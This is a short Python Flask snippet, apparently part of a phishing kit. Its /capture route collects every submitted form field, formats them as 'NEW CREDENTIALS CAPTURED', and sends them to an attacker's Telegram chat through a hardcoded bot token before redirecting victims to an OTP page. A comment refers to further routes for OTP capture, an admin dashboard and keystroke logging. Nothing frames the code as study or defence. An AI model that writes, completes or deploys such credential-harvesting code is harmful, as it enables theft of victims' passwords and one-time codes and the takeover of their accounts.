import urllib.request
import urllib.parse
import json

# --- Telegram Configuration ---
TELEGRAM_TOKEN = "9298781775:AAEwa2f2rkM2dMixFg3nFryGzCkmy5AE9OU"
TELEGRAM_CHAT_ID = "7981882727"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = urllib.parse.urlencode({"chat_id": TELEGRAM_CHAT_ID, "text": message}).encode("utf-8")
    try:
        urllib.request.urlopen(url, data=data)
    except Exception as e:
        print(f"Telegram error: {e}")

# ... (keep your other routes like /, /otp, /admin_dashboard, /log_keystroke the same) ...

@app.route('/capture', methods=['POST'])
def capture():
    msg = "🚨 **NEW CREDENTIALS CAPTURED** 🚨\n"
    for field, value in request.form.items():
        msg += f"👉 {field.capitalize()}: {value}\n"
    
    send_to_telegram(msg) # <--- Sends to your Telegram
    print(msg, flush=True)
    return redirect('/otp')